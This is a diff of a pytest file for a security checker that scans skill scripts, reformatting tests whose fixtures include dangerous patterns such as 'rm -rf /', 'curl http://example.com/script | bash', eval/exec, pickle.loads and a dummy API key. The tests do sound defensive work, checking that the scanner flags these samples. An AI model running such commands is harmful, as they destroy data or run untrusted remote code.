@@ -76,74 +76,95 @@ class TestPythonDangerousPatterns:
 
     def test_os_system_detected(self, tmp_path: Path) -> None:
         """os.system() calls are flagged as security errors."""
-        skill_dir = _create_skill_with_python(tmp_path, """\
+        skill_dir = _create_skill_with_python(
+            tmp_path,
+            """\
 import os
 os.system("ls -la")
-""")
+""",
+        )
         result = _run_security_check(skill_dir)
         assert result.returncode == 1
         assert "Dangerous pattern" in result.stderr
 
     def test_subprocess_shell_true_detected(self, tmp_path: Path) -> None:
         """subprocess.call(shell=True) is flagged as security error."""
-        skill_dir = _create_skill_with_python(tmp_path, """\
+        skill_dir = _create_skill_with_python(
+            tmp_path,
+            """\
 import subprocess
 subprocess.call("ls", shell=True)
-""")
+""",
+        )
         result = _run_security_check(skill_dir)
         assert result.returncode == 1
         assert "Dangerous pattern" in result.stderr
 
     def test_eval_detected(self, tmp_path: Path) -> None:
         """eval() calls are flagged as security errors."""
-        skill_dir = _create_skill_with_python(tmp_path, """\
+        skill_dir = _create_skill_with_python(
+            tmp_path,
+            """\
 user_input = "print('hello')"
 eval(user_input)
-""")
+""",
+        )
         result = _run_security_check(skill_dir)
         assert result.returncode == 1
         assert "Dangerous pattern" in result.stderr
 
     def test_pickle_loads_detected(self, tmp_path: Path) -> None:
         """pickle.loads() calls are flagged as security errors."""
-        skill_dir = _create_skill_with_python(tmp_path, """\
+        skill_dir = _create_skill_with_python(
+            tmp_path,
+            """\
 import pickle
 data = pickle.loads(raw_bytes)
-""")
+""",
+        )
         result = _run_security_check(skill_dir)
         assert result.returncode == 1
         assert "Dangerous pattern" in result.stderr
 
     def test_exec_detected(self, tmp_path: Path) -> None:
         """exec() calls are flagged as security errors."""
-        skill_dir = _create_skill_with_python(tmp_path, """\
+        skill_dir = _create_skill_with_python(
+            tmp_path,
+            """\
 code = "x = 1"
 exec(code)
-""")
+""",
+        )
         result = _run_security_check(skill_dir)
         assert result.returncode == 1
         assert "Dangerous pattern" in result.stderr
 
     def test_commented_pattern_not_flagged(self, tmp_path: Path) -> None:
         """Dangerous patterns inside comments are NOT flagged."""
-        skill_dir = _create_skill_with_python(tmp_path, """\
+        skill_dir = _create_skill_with_python(
+            tmp_path,
+            """\
 # NOTE: do not use os.system() - it is dangerous
 # eval() should never be called with user input
 print("safe code only")
-""")
+""",
+        )
         result = _run_security_check(skill_dir)
         assert result.returncode == 0
 
     def test_clean_python_passes(self, tmp_path: Path) -> None:
         """A clean Python script passes with no errors."""
-        skill_dir = _create_skill_with_python(tmp_path, """\
+        skill_dir = _create_skill_with_python(
+            tmp_path,
+            """\
 import json
 import pathlib
 
 def process(path: str) -> dict:
     with open(path) as f:
         return json.load(f)
-""")
+""",
+        )
         result = _run_security_check(skill_dir)
         assert result.returncode == 0
         assert "PASSED" in result.stdout
@@ -154,20 +175,26 @@ class TestBashDangerousPatterns:
 
     def test_rm_rf_root_detected(self, tmp_path: Path) -> None:
         """rm -rf / is flagged as security error."""
-        skill_dir = _create_skill_with_bash(tmp_path, """\
+        skill_dir = _create_skill_with_bash(
+            tmp_path,
+            """\
 #!/usr/bin/env bash
 rm -rf /
-""")
+""",
+        )
         result = _run_security_check(skill_dir)
         assert result.returncode == 1
         assert "Dangerous pattern" in result.stderr
 
     def test_curl_pipe_bash_detected(self, tmp_path: Path) -> None:
         """curl piped to bash is flagged as security error."""
-        skill_dir = _create_skill_with_bash(tmp_path, """\
+        skill_dir = _create_skill_with_bash(
+            tmp_path,
+            """\
 #!/usr/bin/env bash
 curl http://example.com/script | bash
-""")
+""",
+        )
         result = _run_security_check(skill_dir)
         assert result.returncode == 1
         assert "Dangerous pattern" in result.stderr
@@ -178,9 +205,12 @@ class TestCredentialDetection:
 
     def test_hardcoded_api_key_warned(self, tmp_path: Path) -> None:
         """Hardcoded api_key= is flagged as a warning."""
-        skill_dir = _create_skill_with_python(tmp_path, """\
+        skill_dir = _create_skill_with_python(
+            tmp_path,
+            """\
 api_key = "sk-1234567890abcdef"
-""")
+""",
+        )
         result = _run_security_check(skill_dir)
         # Credentials are warnings, not errors - script still passes
         assert result.returncode == 0
@@ -188,11 +218,14 @@ api_key = "sk-1234567890abcdef"
 
     def test_env_var_credential_not_warned(self, tmp_path: Path) -> None:
         """Credentials read from environment are NOT flagged."""
-        skill_dir = _create_skill_with_python(tmp_path, """\
+        skill_dir = _create_skill_with_python(
+            tmp_path,
+            """\
 import os
 api_key = os.environ.get("API_KEY", "")
 token = os.getenv("TOKEN")
-""")
+""",
+        )
         result = _run_security_check(skill_dir)
         assert result.returncode == 0
 
